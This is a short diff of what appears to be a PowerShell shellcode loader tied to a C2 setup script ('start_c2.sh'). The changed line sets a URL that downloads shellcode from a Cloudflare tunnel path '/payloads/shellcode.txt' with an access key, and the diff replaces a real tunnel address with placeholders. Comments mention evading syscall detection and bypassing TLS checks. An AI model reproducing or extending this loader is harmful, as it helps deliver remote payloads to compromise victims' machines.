@@ -2,7 +2,7 @@
 # Uses standard API calls (no syscalls) for maximum compatibility
 
 # ===== AUTO-UPDATED BY start_c2.sh =====
-$scUrl = 'https://spots-benefit-herb-mods.trycloudflare.com/payloads/shellcode.txt?key=7fd57214ed9dddd9'
+$scUrl = 'https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 # =======================================
 
 # SSL/TLS bypass for PS5
